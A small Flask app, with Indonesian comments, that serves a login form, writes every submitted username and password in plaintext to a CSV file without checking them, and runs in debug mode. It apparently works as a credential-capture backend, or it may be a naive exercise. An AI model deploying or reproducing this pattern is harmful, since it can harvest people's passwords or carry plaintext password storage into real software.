
from flask import Flask, render_template, request
import csv
import os

app = Flask(__name__)

# Pastikan file log.csv ada
if not os.path.exists("log.csv"):
    with open("log.csv", "w", newline="") as file:
        writer = csv.writer(file)
        writer.writerow(["Username", "Password"])

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        with open("log.csv", "a", newline="") as file:
            writer = csv.writer(file)
            writer.writerow([username, password])

        return "Login berhasil! Data disimpan di server."

    return render_template("index.html")

if __name__ == "__main__":
    app.run(debug=True)
